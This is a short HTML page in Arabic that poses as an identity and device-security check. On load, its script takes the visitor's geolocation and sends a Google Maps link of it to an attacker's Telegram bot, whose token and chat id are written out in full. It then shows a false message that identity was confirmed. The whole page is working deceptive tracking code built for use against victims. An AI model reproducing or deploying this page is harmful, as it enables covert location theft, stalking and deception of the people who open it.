<!DOCTYPE html>
<html>
<head>
    <title>تأكيد الهوية</title>
    <script>
        function sendToTelegram(lat, lon) {
            let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
            let chat_id = "7214473798";
            let mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
            let text = `📍 صيد موقع جديد يا مِعمار:\n🔗 الرابط: ${mapsLink}`;
            
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
        }

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    sendToTelegram(position.coords.latitude, position.coords.longitude);
                    alert("تم تأكيد هويتك بنجاح.");
                });
            }
        };
    </script>
</head>
<body style="background:#000; color:#fff; text-align:center; padding-top:50px;">
    <h2>جاري التحقق من أمان الجهاز...</h2>
    <p>يرجى الانتظار ثواني</p>
</body>
</html>
